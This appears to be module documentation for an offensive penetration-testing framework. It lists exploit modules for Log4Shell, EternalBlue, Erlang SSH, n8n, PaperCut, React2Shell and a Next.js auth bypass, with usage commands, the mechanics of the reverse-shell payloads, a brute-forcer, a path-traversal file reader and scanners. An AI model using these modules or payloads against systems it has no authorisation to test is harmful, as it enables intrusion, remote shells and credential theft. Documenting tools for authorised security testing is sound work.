# Amatsumara Framework — Module Documentation

This document provides detailed technical documentation for every exploit and auxiliary module shipped with the Amatsumara Framework. Each entry includes the vulnerability context, configurable options with defaults, example usage, expected output, operational caveats, and external references. Modules are grouped by type — Exploits first, then Auxiliary — and listed alphabetically within each group.

---

## Exploits

### Apache Log4j Remote Code Execution (Log4Shell) — `apache_log4j_rce`
> CVE-2021-44228, CVE-2021-45046, CVE-2021-45105 | CVSS 10.0 | Apache Log4j 2.0-beta9 – 2.14.1

**Summary**
Exploits the Log4Shell vulnerability in Apache Log4j 2.x. When a Java application using Log4j processes a specially crafted `${jndi:ldap://...}` string, it performs a JNDI lookup that loads and executes arbitrary Java bytecode from an attacker-controlled server. This module is self-contained: it spins up an internal LDAP referral server on SRVPORT, an HTTP class server on port 8888, and a reverse shell listener on LPORT, then injects the JNDI payload into the target via a configurable HTTP header.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target address |
| RPORT | 80 | No | Target HTTP port |
| TARGETURI | / | No | Target URI path |
| SSL | false | No | Use HTTPS |
| SRVHOST | | Yes | LDAP/HTTP callback server address (attacker IP) |
| SRVPORT | 1389 | No | LDAP server port for callback |
| LDAP_PATH | /Exploit | No | LDAP path |
| HEADER | User-Agent | No | HTTP header to inject (User-Agent, X-Api-Version, Referer, X-Forwarded-For) |
| METHOD | GET | No | HTTP method (GET, POST) |
| LHOST | | Yes | Listener IP for reverse shell callback |
| LPORT | 4444 | No | Listener port for reverse shell callback |

**Usage**
```
use exploits/apache_log4j_rce
set RHOSTS 10.10.10.10
set RPORT 8080
set SRVHOST 10.10.14.5
set LHOST 10.10.14.5
set LPORT 4444
strike
```

**Expected Output**
The module starts three listeners (LDAP on SRVPORT, HTTP class server on 8888, reverse shell on LPORT), then sends the JNDI payload to the target. On success you will see LDAP and HTTP connections logged from the target, followed by `[+] Reverse shell received from <IP>:<PORT>` and session registration. The `check` command probes for Java indicators (Apache-Coyote, Tomcat, JSESSIONID) but cannot confirm Log4j usage directly.

**Caveats**
- The exploit builds a Java 5 (version 49.0) class to avoid StackMapTable requirements; targets running Java 8u191+ with `com.sun.jndi.ldap.object.trustURLCodebase=false` are not exploitable via this vector without additional bypass.
- The JNDI payload is injected via both the specified header and as a URL query parameter; the target application must log at least one of these fields through Log4j.
- Ports 8888 (HTTP class server) and SRVPORT (LDAP) must be reachable from the target.
- All internal servers time out after 30 seconds.
- Reverse shell payload is bash-based (`/dev/tcp`); target JVM must be running on a Linux host with bash.

**References**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Apache Advisory: https://logging.apache.org/log4j/2.x/security.html
- Original module by p0rz9, wvu

---

### Erlang/OTP SSH Pre-Auth RCE — `erlang_otp_ssh_rce`
> CVE-2025-32433 | CVSS 10.0 | Erlang/OTP >= 17.0 up to OTP-27.3.3 / 26.2.5.11 / 25.3.2.20

**Summary**
Exploits a pre-authentication remote code execution vulnerability in Erlang/OTP's built-in SSH server. The SSH daemon processes `SSH_MSG_CHANNEL_OPEN` and `SSH_MSG_CHANNEL_REQUEST` messages before key exchange and authentication complete, allowing an unauthenticated attacker to open a session channel and execute arbitrary Erlang code via `os:cmd()`. The module operates over raw TCP sockets — no SSH library required.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target address |
| RPORT | 22 | Yes | Target SSH port |
| LHOST | | Yes | Listener IP for reverse shell callback |
| LPORT | 4444 | No | Listener port for reverse shell callback |
| CMD | id | No | Command to execute via Erlang os:cmd (verification stage) |

**Usage**
```
use exploits/erlang_otp_ssh_rce
set RHOSTS 10.10.10.10
set RPORT 22
set LHOST 10.10.14.5
strike
```

**Expected Output**
Stage 1 executes the CMD option via `os:cmd()` wrapped in an Erlang `file:write_file` expression (output not available over the unencrypted channel). Stage 2 delivers a reverse shell payload using `mkfifo` + `nc`, with a bash `/dev/tcp` fallback. On success: `[+] Reverse shell received from <IP>:<PORT>` and session registration. The `check` command connects and reads the SSH banner; `SSH-2.0-Erlang/` indicates a vulnerable server.

**Caveats**
- Only Erlang/OTP's native SSH server is affected; OpenSSH is not vulnerable.
- The exploit sends raw SSH packets without completing key exchange — the connection is unencrypted and command output from Stage 1 cannot be retrieved.
- Reverse shell depends on `nc` (netcat) or `bash` with `/dev/tcp` support on the target.
- Each exploit stage opens a separate TCP connection with 500ms delays between packet sends.
- 30-second timeout on the reverse shell listener.

**References**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-32433
- Erlang/OTP Security Advisory

---

### MS17-010 EternalBlue SMB Remote Code Execution — `ms17_010`
> CVE-2017-0143 through CVE-2017-0148 | CVSS 9.8 | Windows SMBv1 (Windows XP – Windows Server 2016, unpatched)

**Summary**
Exploits the EternalBlue vulnerability in Microsoft's SMBv1 implementation. The module performs a full SMB1 negotiation, anonymous session setup, and IPC$ tree connect, then sends crafted TRANSACTION and TRANS2 requests that trigger a kernel-level buffer overflow. The check function distinguishes patched from unpatched hosts by examining NT_STATUS codes (`STATUS_INSUFF_SERVER_RESOURCES` = vulnerable). The exploit path uses pool grooming and shellcode injection to achieve SYSTEM-level code execution.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host or IP address |
| RPORT | 445 | No | Target SMB port |
| LHOST | | Yes | Listener IP for reverse shell callback |
| LPORT | 4444 | No | Listener port for reverse shell callback |

**Usage**
```
use exploits/ms17_010
set RHOSTS 10.10.10.10
set LHOST 10.10.14.5
strike
```

**Expected Output**
The `check` command performs SMB negotiation and sends a PeekNamedPipe transaction to probe the target, reporting `Vulnerable` (STATUS_INSUFF_SERVER_RESOURCES), `Likely patched` (STATUS_ACCESS_DENIED/STATUS_INVALID_HANDLE), or connection status. The `run` command executes the full exploit chain including pool grooming and shellcode delivery. On success, a session is registered as a reverse shell from the target.

**Caveats**
- Target must have SMBv1 enabled and MS17-010 patch not applied.
- The exploit uses anonymous (null session) authentication for IPC$ tree connect; some configurations may block this.
- Dual-path implementation handles both Windows 7/2008R2 and Windows 8+/2012+ pool allocation differences.
- Kernel exploits are inherently risky — failed attempts may cause a Blue Screen of Death (BSOD).
- Windows XP requires different shellcode offsets that may not be covered.

**References**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-0143
- MS Bulletin: https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
- Original: zerosum0x0/eternalblue-doublepulsar

---

### n8n Workflow Expression Injection RCE — `n8n_rce`
> CVE-2025-68613 | CVSS 9.9 | n8n 0.211.0 – 1.120.3, 1.121.0

**Summary**
Authenticated remote code execution in the n8n workflow automation platform. The workflow expression evaluation engine processes user-supplied `{{ }}` expressions without sandboxing, allowing access to the Node.js runtime via `this.process.mainModule`. Any valid n8n user account (email + password) is sufficient — no admin privileges required. The module authenticates, creates a malicious workflow with an injected expression, executes a verification command via `execSync`, then delivers a reverse shell and cleans up created workflows.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target address |
| RPORT | 5678 | Yes | Target port (n8n web interface) |
| SSL | false | No | Use HTTPS |
| TARGETURI | / | No | Base path |
| USERNAME | | Yes | n8n account email address |
| PASSWORD | | Yes | n8n account password |
| LHOST | | Yes | Listener IP for reverse shell callback |
| LPORT | 4444 | No | Listener port for reverse shell callback |
| CMD | id | No | Command to execute for verification |

**Usage**
```
use exploits/n8n_rce
set RHOSTS 10.10.10.10
set RPORT 5678
set USERNAME user@example.com
set PASSWORD password123
set LHOST 10.10.14.5
strike
```

**Expected Output**
Stage 1 authenticates to n8n (bearer token or cookie session). Stage 2 creates a workflow with a `Set` node containing an expression injection payload that calls `execSync(CMD)`, then retrieves and prints the command output. Stage 3 delivers a reverse shell payload via `child_process.exec()`. Stage 4 deletes all created workflows. The `check` command fetches `/rest/settings` and parses `versionCli` to determine if the version is in the vulnerable range.

**Caveats**
- Requires valid credentials (any non-admin user suffices).
- Handles both modern (`emailOrLdapLoginId`) and legacy (`email`) n8n login field names.
- n8n uses "flatted" serialization for execution data; the module includes a flatted parser for output extraction.
- Reverse shell payload uses `bash -i >& /dev/tcp/` — requires bash on the target.
- Workflow cleanup (Stage 4) runs even on partial failure to reduce forensic artifacts.
- The 3-second delay between workflow execution and output retrieval may be insufficient on slow targets.

**References**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-68613

---

### PaperCut MF/NG Authentication Bypass RCE — `papercut_rce`
> CVE-2023-27350 | CVSS 9.8 | PaperCut MF/NG 8.0 – 22.0.8

**Summary**
Unauthenticated remote code execution in PaperCut MF/NG print management software. Improper access control on the `SetupCompleted` page allows an attacker to obtain an admin session without credentials. The module then enables print scripting, disables the script sandbox, and injects a reverse shell payload into a printer's print job hook. Commands execute as SYSTEM (Windows) or root (Linux) via Java's `Runtime.exec()`.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target address |
| RPORT | 9191 | Yes | Target port (PaperCut web interface) |
| TARGETURI | / | No | Base path |
| LHOST | | Yes | Listener IP for reverse shell callback |
| LPORT | 4444 | No | Listener port for reverse shell callback |
| CMD | id | No | Command to execute for verification |

**Usage**
```
use exploits/papercut_rce
set RHOSTS 10.10.10.10
set RPORT 9191
set LHOST 10.10.14.5
strike
```

**Expected Output**
The module executes a 10-step chain: (1) trigger auth bypass via SetupCompleted, (2) solidify admin session, (3-4) enable print scripting, (5) disable script sandbox, (6-8) navigate to printer scripting tab, (9) inject PowerShell reverse shell payload, (10) restore config settings. On success: `[+] Reverse shell received` and session registration. The `check` command probes the SetupCompleted page for auth bypass indicators.

**Caveats**
- The reverse shell payload is Windows-specific (PowerShell encoded command via `-e` flag); Linux targets require a different payload.
- Printer ID defaults to `l1001` if extraction from the printer list page fails.
- The exploit modifies server configuration (enables scripting, disables sandbox) and attempts to restore settings in a cleanup step, but cleanup may fail if the session is interrupted.
- PaperCut instances that have completed initial setup normally may still be vulnerable if the SetupCompleted endpoint remains accessible.
- The `CMD` option is defined but the verification command is not executed in the current implementation — the module proceeds directly to the reverse shell.

**References**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-27350
- Huntress: https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software

---

### React Server Components RCE via Flight Protocol Deserialization (React2Shell) — `react2shell_rce`
> CVE-2025-55182 | CVSS 10.0 | react-server-dom-webpack, react-server-dom-parcel, react-server-dom-turbopack 19.0.0, 19.1.0, 19.1.1, 19.2.0

**Summary**
Pre-authentication remote code execution in React Server Components via insecure deserialization of the RSC Flight protocol. The attacker sends a crafted multipart POST that pollutes `Promise.prototype.then`, gaining access to internal `_response` state. The `_prefix` field is executed server-side via `Function.constructor`, achieving arbitrary JavaScript execution in the Node.js context without any authentication.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target address |
| RPORT | 3000 | Yes | Target port |
| TARGETURI | / | No | RSC endpoint path |
| LHOST | | Yes | Listener IP for reverse shell callback |
| LPORT | 4444 | No | Listener port for reverse shell callback |
| CMD | id | No | Command to execute for RCE verification |

**Usage**
```
use exploits/react2shell_rce
set RHOSTS 10.10.10.10
set RPORT 3000
set LHOST 10.10.14.5
strike
```

**Expected Output**
Stage 1 sends an HTTP callback probe to verify RCE — the target makes an outbound HTTP GET to `LHOST:LPORT/react2shell-verify`. If confirmed, Stage 2 delivers a Node.js native reverse shell payload (using `net.Socket` and `child_process.spawn`). The `check` command sends a benign proto-pollution probe; HTTP 500 with `Content-Type: text/x-component` indicates vulnerability. On success: `[+] RCE confirmed! Callback from <IP>` followed by `[+] Reverse shell received`.

**Caveats**
- The exploit uses a 5-chunk multipart gadget chain targeting the RSC Flight protocol deserializer; only applications using React Server Components with the affected packages are vulnerable.
- Verification binds a temporary listener on LHOST:LPORT for 5 seconds; the same port is then reused for the reverse shell listener.
- The reverse shell is a native Node.js implementation (no bash dependency).
- Sends `Next-Action: x` and `Next-Router-State-Tree` headers — the target must be a Next.js application using React Server Components.
- The `CMD` option is defined but not used in the current exploit flow; verification is done via HTTP callback rather than command output.

**References**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-55182

---

## Auxiliary

### Next.js Middleware Auth Bypass — `nextjs_auth_bypass`
> CVE-2025-29927 | CVSS 9.1 | Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5

**Summary**
Authentication bypass in Next.js middleware via the `x-middleware-subrequest` header. Versions prior to 15.2.3, 14.2.25, 13.5.9, and 12.3.5 trust this header internally to prevent recursive middleware execution. An external attacker can set the same header to cause the framework to skip all middleware-based authentication and authorization checks, gaining access to protected routes.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host |
| RPORT | 3000 | No | Target port |
| SSL | false | No | Use HTTPS |
| RPATH | /protected | No | Protected route to attempt bypass on |

**Usage**
```
use auxiliary/nextjs_auth_bypass
set RHOSTS 10.10.10.10
set RPORT 3000
set RPATH /admin/dashboard
strike
```

**Expected Output**
The module first sends a baseline request to RPATH without bypass headers. If the route returns HTTP 200, it reports that the route is already public and no bypass is needed. Otherwise, it iterates through known middleware path values (`middleware`, `src/middleware`, `pages/_middleware`, etc.) in the `x-middleware-subrequest` header. A successful bypass is reported when the response changes to HTTP 200. No shell or RCE is involved — this module demonstrates authentication bypass only and prints the response status for each attempt.

**Caveats**
- This is an authentication bypass, not an RCE. It demonstrates that protected routes can be accessed without credentials.
- Effectiveness depends on the application's middleware path matching one of the tested header values.
- No `check` function is implemented.
- Does not extract or display page content — only reports HTTP status codes.

**References**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-29927
- Next.js Security Advisory

---

### SimpleHelp Path Traversal File Read — `simplehelp_file_read`
> CVE-2024-57727 | CVSS 7.5 | SimpleHelp <= 5.5.7

**Summary**
Unauthenticated arbitrary file read via path traversal in SimpleHelp remote support software. The `/toolbox-resource/` endpoint does not sanitize requested paths, allowing `../` sequences to escape the web root and read arbitrary files on the server. The module uses raw TCP to preserve traversal sequences that HTTP libraries would normalize, and iterates through 16 known valid subdirectory names to locate the correct traversal base.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host |
| RPORT | 80 | No | Target port |
| SSL | false | No | Use HTTPS |
| TARGETURI | / | No | Base URI path for SimpleHelp |
| FILEPATH | configuration/serverconfig.xml | No | File to read relative to SimpleHelp root (or absolute for OS files) |
| DEPTH | 2 | No | Traversal depth (2 = SimpleHelp root, 6-8 = /etc/passwd) |
| OUTFILE | | No | Save retrieved file contents to this path |

**Usage**
```
use auxiliary/simplehelp_file_read
set RHOSTS 10.10.10.10
set RPORT 443
set SSL true
set FILEPATH configuration/serverconfig.xml
strike
```

**Expected Output**
The module probes multiple directory names as traversal bases until one returns file content. On success, the file contents are printed to the console. When reading `serverconfig.xml`, credential fields (password, apiKey, token, secret, etc.) are automatically highlighted. If OUTFILE is set, the content is also saved to disk. No shell or RCE is involved — this is a file read primitive. The `check` command probes `/allversions` and `/welcome` to detect the SimpleHelp version and determine vulnerability status.

**Caveats**
- Uses raw TCP HTTP requests rather than a client library to prevent path normalization.
- The valid directory list is hardcoded (`secmsg`, `html`, `toolbox`, `alertsdb`, `backups`, `sslconfig`, etc.); the module iterates until one succeeds.
- DEPTH must be tuned to the target: 2 for SimpleHelp root-relative files, 6-8 for absolute OS paths like `/etc/passwd`.
- Does not support writing files — read-only primitive.

**References**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-57727
- Horizon3.ai: SimpleHelp Path Traversal Advisory

---

### Elasticsearch Banner Scanner — `scanner/elasticsearch`
> N/A | N/A | Elasticsearch (all versions)

**Summary**
Connects to an Elasticsearch instance and retrieves the service banner. Used for service enumeration and version fingerprinting during reconnaissance.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 9200 | No | Elasticsearch port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/elasticsearch
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints `[+] <host>: <banner>` on successful connection, or `[-] <host>: <error>` on failure. No shell, RCE, or authentication is involved — this is a passive banner grab.

**Caveats**
- Reads raw bytes from the socket; does not send an HTTP request or parse JSON responses.
- Single-host operation per invocation.

**References**
- N/A — service enumeration tool

---

### FTP Anonymous Login Scanner — `scanner/ftp`
> N/A | N/A | FTP servers (all implementations)

**Summary**
Tests FTP servers for anonymous login access by attempting authentication with `USER anonymous` / `PASS anonymous`. Reports whether the server allows unauthenticated access.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 21 | No | FTP port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/ftp
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Reads the FTP welcome banner (220), sends USER/PASS commands, and checks for 230 (login success). Reports `[+]` for anonymous access allowed or `[-]` for denied. No file operations are performed — the module disconnects immediately after authentication.

**Caveats**
- Does not perform directory listing or file download after successful login.
- Only tests the `anonymous`/`anonymous` credential pair.

**References**
- N/A — service enumeration tool

---

### HTTP Basic Authentication Brute Force — `scanner/http_auth`
> N/A | N/A | HTTP servers with Basic Authentication

**Summary**
Attempts to brute force HTTP Basic Authentication credentials by iterating through a password list for a given username. Uses base64-encoded `Authorization: Basic` headers.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host |
| RPORT | 80 | No | Target port |
| TARGETURI | / | No | Target URI path |
| SSL | false | No | Use HTTPS |
| USERNAME | admin | No | Single username to test |
| PASS_FILE | | No | File containing passwords (one per line) |

**Usage**
```
use auxiliary/scanner/http_auth
set RHOSTS 10.10.10.10
set RPORT 8080
set TARGETURI /admin
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
strike
```

**Expected Output**
For each password attempt, the module sends a GET request with the `Authorization: Basic` header. HTTP 401/403 responses are reported as failed; any other status is treated as a successful credential. On success, prints the valid username:password pair. No shell or RCE is involved.

**Caveats**
- Tests a single username only; does not support username lists.
- If PASS_FILE is empty or not specified, uses a built-in list of 18 common passwords (admin, password, 123456, root, toor, etc.).
- Does not parse `WWW-Authenticate` headers or handle digest/NTLM authentication.
- Sequential requests — no parallelism. May be slow against rate-limited targets.

**References**
- N/A — credential testing tool

---

### HTTP Directory Scanner — `scanner/http`
> N/A | N/A | HTTP/HTTPS web servers

**Summary**
Scans web servers for common directories and files using a built-in wordlist of approximately 47 paths. Reports any path that returns a non-404 response.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) to scan |
| RPORT | 80 | No | Target port |
| SSL | false | No | Use HTTPS |
| VHOST | | No | Virtual host header |
| THREADS | 10 | No | Number of concurrent threads |

**Usage**
```
use auxiliary/scanner/http
set RHOSTS 10.10.10.10
set RPORT 443
set SSL true
strike
```

**Expected Output**
Iterates through common paths (/admin, /login.php, /wp-admin, /phpmyadmin, /cpanel, /.git, /.env, /robots.txt, etc.) and reports discovered paths with HTTP status codes. Prints `[+] Found N interesting path(s)` or `[-] No interesting paths found`. No shell or RCE is involved.

**Caveats**
- The THREADS option is parsed but not currently used — scanning is sequential.
- Fixed wordlist only; does not support external wordlist files.
- Any non-404 response is treated as "found," which may produce false positives on servers that return custom error pages with 200 status.
- Does not follow redirects or inspect response bodies.

**References**
- N/A — web enumeration tool

---

### IMAP Banner Scanner — `scanner/imap`
> N/A | N/A | IMAP servers (all implementations)

**Summary**
Connects to an IMAP service and retrieves the server banner for version fingerprinting and service enumeration.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 143 | No | IMAP port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/imap
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints `[+] <host>: <banner>` on successful connection. No authentication or mailbox operations are performed.

**Caveats**
- Passive banner grab only; does not send IMAP commands.

**References**
- N/A — service enumeration tool

---

### LDAP Banner Scanner — `scanner/ldap`
> N/A | N/A | LDAP servers (all implementations)

**Summary**
Connects to an LDAP service and retrieves the initial banner bytes for service detection and fingerprinting.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 389 | No | LDAP port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/ldap
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints the banner bytes received from the LDAP service. No bind or search operations are performed.

**Caveats**
- Passive banner grab; does not send LDAP protocol messages. LDAP servers may not send unsolicited data, resulting in a timeout with no output.

**References**
- N/A — service enumeration tool

---

### Memcached Banner Scanner — `scanner/memcached`
> N/A | N/A | Memcached (all versions)

**Summary**
Connects to a Memcached instance and retrieves the service banner for enumeration purposes.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 11211 | No | Memcached port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/memcached
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints the banner or initial bytes received from the Memcached service. No cache operations are performed.

**Caveats**
- Passive banner grab; does not send `stats` or `version` commands.

**References**
- N/A — service enumeration tool

---

### MySQL Banner Scanner — `scanner/mysql`
> N/A | N/A | MySQL/MariaDB (all versions)

**Summary**
Connects to a MySQL service and reads the server greeting packet, which contains version information and server capabilities.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 3306 | No | MySQL port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/mysql
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints the MySQL server greeting banner (typically contains version string). No authentication or queries are performed.

**Caveats**
- Reads raw greeting packet; does not parse the MySQL protocol handshake structure.

**References**
- N/A — service enumeration tool

---

### POP3 Banner Scanner — `scanner/pop3`
> N/A | N/A | POP3 servers (all implementations)

**Summary**
Connects to a POP3 service and retrieves the server greeting banner for version fingerprinting.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 110 | No | POP3 port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/pop3
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints the POP3 `+OK` greeting banner. No authentication or mailbox operations are performed.

**Caveats**
- Passive banner grab only.

**References**
- N/A — service enumeration tool

---

### TCP Port Scanner — `scanner/portscan`
> N/A | N/A | Any TCP service

**Summary**
Performs TCP connect scanning against a target host to identify open ports. Supports port ranges and comma-separated lists.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) to scan |
| PORTS | 1-1000 | Yes | Ports to scan (e.g., 1-1000, 22,80,443) |
| TIMEOUT | 1000 | No | Connection timeout in milliseconds |

**Usage**
```
use auxiliary/scanner/portscan
set RHOSTS 10.10.10.10
set PORTS 1-65535
set TIMEOUT 500
strike
```

**Expected Output**
Reports each open port as `[+] <host>: <port>  OPEN` and prints a summary of all open ports found. No shell or RCE is involved — this is a network reconnaissance tool.

**Caveats**
- TCP connect scan (full 3-way handshake) — not stealthy and slower than SYN scanning.
- TIMEOUT is in milliseconds, not seconds (default 1000ms = 1s).
- Sequential port checking; scanning large ranges (e.g., 1-65535) will be slow.
- Does not perform service identification or banner grabbing.

**References**
- N/A — network reconnaissance tool

---

### Redis Banner Scanner — `scanner/redis`
> N/A | N/A | Redis (all versions)

**Summary**
Connects to a Redis instance and retrieves the initial service banner for enumeration and version detection.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 6379 | No | Redis port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/redis
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints any data received from the Redis service on connection. No `PING`, `INFO`, or other Redis commands are sent.

**Caveats**
- Passive banner grab; Redis may not send data until a command is issued, potentially resulting in a timeout.

**References**
- N/A — service enumeration tool

---

### SMB Version Scanner — `scanner/smb`
> N/A | N/A | Windows/Samba SMB services

**Summary**
Sends an SMB Negotiate Protocol Request to detect the SMB protocol version running on the target. Distinguishes between SMB1 and SMB2/SMB3 by examining magic bytes in the response.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) to scan |
| RPORT | 445 | No | Target SMB port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/smb
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Reports `SMB service detected` (SMBv1), `SMB2/SMB3 service detected`, or `Unknown SMB-like service detected` based on response magic bytes at offset 4 (`0xFF534D42` for SMB1, `0xFE534D42` for SMB2+). No authentication or share enumeration is performed.

**Caveats**
- Simplified protocol probe — does not extract OS version, domain name, or server name.
- Response parsing relies on magic byte position; non-standard implementations may be misidentified.

**References**
- N/A — service enumeration tool

---

### SMTP Banner Scanner — `scanner/smtp`
> N/A | N/A | SMTP servers (all implementations)

**Summary**
Connects to an SMTP service and retrieves the server greeting banner for version fingerprinting and service enumeration.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 25 | No | SMTP port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/smtp
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints the SMTP 220 greeting banner. No `EHLO`, `HELO`, or mail relay testing is performed.

**Caveats**
- Passive banner grab; does not test for open relay or enumerate users via VRFY/EXPN.

**References**
- N/A — service enumeration tool

---

### SSH Version Scanner — `scanner/ssh`
> N/A | N/A | SSH servers (all implementations)

**Summary**
Connects to an SSH service and reads the protocol version string. Validates that the response begins with `SSH-`, confirming the service identity.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 22 | No | SSH port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/ssh
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints the SSH version string (e.g., `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6`). Validates the `SSH-` prefix before reporting.

**Caveats**
- Does not parse the protocol version or software identification fields separately.
- Reads up to 256 bytes only.

**References**
- N/A — service enumeration tool

---

### Telnet Banner Scanner — `scanner/telnet`
> N/A | N/A | Telnet servers (all implementations)

**Summary**
Connects to a Telnet service and retrieves whatever initial data the server sends, typically a login prompt or MOTD banner.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 23 | No | Telnet port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/telnet
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints the raw bytes received from the Telnet service. May include Telnet option negotiation bytes (IAC sequences) mixed with banner text.

**Caveats**
- Does not handle Telnet option negotiation (IAC/DO/DONT/WILL/WONT); raw bytes may appear garbled.

**References**
- N/A — service enumeration tool

---

### VNC Banner Scanner — `scanner/vnc`
> N/A | N/A | VNC servers (all implementations)

**Summary**
Connects to a VNC service and retrieves the initial protocol version string for service detection and version enumeration.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| RHOSTS | | Yes | Target host(s) |
| RPORT | 5900 | No | VNC port |
| TIMEOUT | 5 | No | Connection timeout in seconds |

**Usage**
```
use auxiliary/scanner/vnc
set RHOSTS 10.10.10.10
strike
```

**Expected Output**
Prints the VNC protocol version string (e.g., `RFB 003.008`). No authentication or framebuffer operations are performed.

**Caveats**
- Does not parse the RFB protocol version or enumerate supported authentication methods.

**References**
- N/A — service enumeration tool

---

## Utilities

Utility modules are framework-level tools that support exploit workflows but are not exploits themselves. They do not target specific vulnerabilities or CVEs.

### Multi Handler — `multi_handler`
> N/A | N/A | Generic payload handler

**Summary**
A generic reverse payload listener that binds a port and waits for incoming connections from any reverse shell payload. When a connection is received, the handler verifies shell access by sending `id` and registers the connection as an interactive session. Typically used alongside exploit modules that deliver a reverse shell payload but do not include a built-in listener.

**Options**
| Option | Default | Required | Description |
|--------|---------|----------|-------------|
| LHOST | 0.0.0.0 | Yes | Listen address (0.0.0.0 for all interfaces) |
| LPORT | 4444 | Yes | Listen port |
| TIMEOUT | 0 | No | Seconds to wait for connection (0 = wait forever) |

**Usage**
```
use utilities/multi_handler
set LHOST 0.0.0.0
set LPORT 4444
run -j
```

**Expected Output**
The handler prints `[*] Starting handler on 0.0.0.0:4444` and `[*] Waiting for connections...`. When a reverse shell connects: `[+] Connection received from <IP>:<PORT>`, shell verification output (e.g., `uid=0(root)`), and `[+] Session created`. The `-j` flag runs the handler as a background job.

**Caveats**
- No `check` function — this is a listener, not an exploit.
- TIMEOUT=0 blocks indefinitely; use `-j` for background operation.
- Shell verification sends `id\n` which may produce unexpected output on non-Unix shells (e.g., Windows cmd.exe).
- Accepts exactly one connection per invocation; restart or re-run for additional sessions.

**References**
- N/A — framework utility
